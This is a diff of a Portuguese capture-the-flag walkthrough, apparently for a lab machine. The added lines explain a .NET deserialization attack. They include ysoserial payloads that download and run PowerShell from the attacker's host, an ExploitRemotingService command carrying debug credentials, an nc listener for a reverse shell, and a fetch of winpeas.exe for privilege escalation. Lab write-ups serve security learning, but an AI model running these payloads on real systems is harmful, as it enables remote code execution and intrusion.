@@ -160,20 +160,29 @@ Devemos compilar o yososerial ou baixa-lo já [compilado](https://github.com/pwn
 Após isso, devemos preparar nossa shell.
 Usaremos está [shell.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)
 
+Vamos usar o ysoserial para criar nosso payload:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('10.10.14.136/chu.ps1')"
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Com o ExploitRemotingService enviaremos o nosso payload:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+
+Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+python -m SimpleHTTPServer 80
+nc -vvnlp 1337
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Temos nossa shell inicial :)
+
+Para escalar nossos privilégios, vamos executar o 'winpeas.exe', portanto, devemos envia-lo primeiro, vamos gerar nosso payload no ysoserial:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.128/winpeas.exe')"
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-
 
 
 Ao acessar a pasta C:\users\lars\Documents\ nos deparamos com uma pasta chamada wcf, vamos compacta-la e move-la para o diretório compartilhado do SMB.
